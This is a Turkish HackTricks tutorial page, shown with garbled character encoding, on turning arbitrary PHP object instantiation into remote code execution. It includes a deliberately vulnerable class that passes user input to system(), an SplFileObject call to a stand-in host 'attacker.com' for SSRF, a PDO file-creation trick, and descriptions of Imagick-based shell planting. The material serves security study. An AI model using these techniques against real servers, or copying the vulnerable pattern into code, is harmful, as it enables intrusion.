# PHP - Nesne oluÅŸturma kÃ¶tÃ¼ye kullanÄ±mÄ±: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmak iÃ§in Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

Bu temel olarak [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) adresindeki bir Ã¶zetidir.

## GiriÅŸ

`new $_GET["a"]($_GET["b"])` gibi yeni keyfi nesnelerin oluÅŸturulmasÄ±, Uzaktan Kod YÃ¼rÃ¼tme (RCE) ile sonuÃ§lanabilir. Bu, [**bir yazÄ±da**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) detaylÄ± olarak aÃ§Ä±klanmÄ±ÅŸtÄ±r. Bu belge, RCE elde etmek iÃ§in Ã§eÅŸitli stratejileri vurgular.

## Ã–zel SÄ±nÄ±flar veya Otomatik YÃ¼kleme ile RCE

`new $a($b)` sÃ¶zdizimi, bir nesnenin oluÅŸturulmasÄ± iÃ§in kullanÄ±lÄ±r, burada **`$a`** sÄ±nÄ±f adÄ±nÄ± temsil eder ve **`$b`** yapÄ±cÄ±ya iletilen ilk argÃ¼mandÄ±r. Bu deÄŸiÅŸkenler, GET/POST gibi kullanÄ±cÄ± giriÅŸlerinden veya JSON'dan alÄ±nabilir, burada dize veya dizi olabilirler veya diÄŸer tÃ¼rler olarak sunulabilirler.

AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dÃ¼ÅŸÃ¼nÃ¼n:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Bu durumda, `$a`'yÄ± `App` veya `App2` olarak ayarlamak ve `$b`'yi bir sistem komutu (Ã¶rneÄŸin, `uname -a`) olarak ayarlamak, o komutun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±na neden olur.

**Otomatik yÃ¼kleme iÅŸlevleri**, doÄŸrudan eriÅŸilebilen sÄ±nÄ±flar yoksa istismar edilebilir. Bu iÅŸlevler, ihtiyaÃ§ duyulduÄŸunda sÄ±nÄ±flarÄ± dosyalardan otomatik olarak yÃ¼kler ve `spl_autoload_register` veya `__autoload` kullanÄ±larak tanÄ±mlanÄ±r:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Autoloading davranÄ±ÅŸÄ±, PHP sÃ¼rÃ¼mlerine gÃ¶re deÄŸiÅŸir ve farklÄ± RCE olanaklarÄ± sunar.

## YerleÅŸik SÄ±nÄ±flar AracÄ±lÄ±ÄŸÄ±yla RCE

Ã–zel sÄ±nÄ±flar veya otomatik yÃ¼kleyiciler olmadÄ±ÄŸÄ±nda, **yerleÅŸik PHP sÄ±nÄ±flarÄ±** RCE iÃ§in yeterli olabilir. Bu sÄ±nÄ±flarÄ±n sayÄ±sÄ±, PHP sÃ¼rÃ¼mÃ¼ne ve uzantÄ±lara baÄŸlÄ± olarak 100 ila 200 arasÄ±nda deÄŸiÅŸir. Bunlar `get_declared_classes()` kullanÄ±larak listelenebilir.

Ä°lgili yapÄ±cÄ±lar, aÅŸaÄŸÄ±daki Ã¶rnekte ve [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF) baÄŸlantÄ±sÄ±nda gÃ¶sterildiÄŸi gibi yansÄ±tma API'si aracÄ±lÄ±ÄŸÄ±yla belirlenebilir.

**Belirli yÃ¶ntemler aracÄ±lÄ±ÄŸÄ±yla RCE ÅŸunlarÄ± iÃ§erir:**

### **SSRF + Phar Deserialization**

`SplFileObject` sÄ±nÄ±fÄ±, yapÄ±cÄ±sÄ± aracÄ±lÄ±ÄŸÄ±yla SSRF'yi etkinleÅŸtirir ve herhangi bir URL'ye baÄŸlantÄ± yapÄ±lmasÄ±na izin verir:
```php
new SplFileObject('http://attacker.com/');
```
SSRF, PHP'nin 8.0 Ã¶ncesi sÃ¼rÃ¼mlerinde Phar protokolÃ¼nÃ¼ kullanarak deserializasyon saldÄ±rÄ±larÄ±na yol aÃ§abilir.

### **PDO'larÄ± SÃ¶mÃ¼rmek**

PDO sÄ±nÄ±fÄ±nÄ±n yapÄ±cÄ± fonksiyonu, DSN dizeleri aracÄ±lÄ±ÄŸÄ±yla veritabanlarÄ±na baÄŸlantÄ± saÄŸlar ve potansiyel olarak dosya oluÅŸturma veya diÄŸer etkileÅŸimleri mÃ¼mkÃ¼n kÄ±lar:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

PHP'nin 5.3.22 ve 5.4.12 sÃ¼rÃ¼mlerine kadar olan versiyonlarÄ±, `SoapClient` ve `SimpleXMLElement` yapÄ±landÄ±rÄ±cÄ±larÄ± aracÄ±lÄ±ÄŸÄ±yla XXE saldÄ±rÄ±larÄ±na aÃ§Ä±ktÄ±, ancak libxml2 sÃ¼rÃ¼mÃ¼ne baÄŸlÄ± olarak deÄŸiÅŸiyordu.

## Imagick UzantÄ±sÄ± AracÄ±lÄ±ÄŸÄ±yla RCE

Bir **projenin baÄŸÄ±mlÄ±lÄ±klarÄ±nÄ±n** analizi sÄ±rasÄ±nda, **Imagick**'in yeni nesnelerin oluÅŸturulmasÄ±yla **komut yÃ¼rÃ¼tme** iÃ§in kullanÄ±labileceÄŸi keÅŸfedildi. Bu, zafiyetlerin sÃ¶mÃ¼rÃ¼lmesi iÃ§in bir fÄ±rsat sunar.

### VID ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ±

VID ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ±nÄ±n, dosya sisteminde belirtilen herhangi bir yola iÃ§erik yazabilme yeteneÄŸi belirlendi. Bu, bir PHP kabuÄŸunun web eriÅŸimine aÃ§Ä±k bir dizine yerleÅŸtirilmesine ve Uzaktan Kod YÃ¼rÃ¼tme (RCE) elde edilmesine yol aÃ§abilir.

#### VID AyrÄ±ÅŸtÄ±rÄ±cÄ±sÄ± + Dosya YÃ¼kleme

PHP'nin geÃ§ici olarak yÃ¼klenen dosyalarÄ± `/tmp/phpXXXXXX` dizininde depoladÄ±ÄŸÄ± belirtilmektedir. Imagick'teki VID ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ±, **msl** protokolÃ¼nÃ¼ kullanarak dosya yollarÄ±nda joker karakterlerini iÅŸleyebilir ve geÃ§ici dosyanÄ±n istenen konuma transferini kolaylaÅŸtÄ±rÄ±r. Bu yÃ¶ntem, dosya sistemi iÃ§inde keyfi dosya yazma iÅŸlemini gerÃ§ekleÅŸtirmek iÃ§in ek bir yaklaÅŸÄ±m sunar.

### PHP Ã‡Ã¶kertme + Kaba Kuvvet

[**Orijinal yazÄ±da**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) aÃ§Ä±klanan bir yÃ¶ntem, silinmeden Ã¶nce sunucuyu Ã§Ã¶kerten dosyalarÄ±n yÃ¼klenmesini iÃ§erir. GeÃ§ici dosyanÄ±n adÄ±nÄ± kaba kuvvetle tahmin ederek, Imagick'in keyfi PHP kodunu yÃ¼rÃ¼tmesi mÃ¼mkÃ¼n hale gelir. Ancak, bu teknik yalnÄ±zca eski bir ImageMagick sÃ¼rÃ¼mÃ¼nde etkili bulundu.

## Referanslar

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olacak ÅŸekilde Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± yapmak veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da takip edin ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github reposuna PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
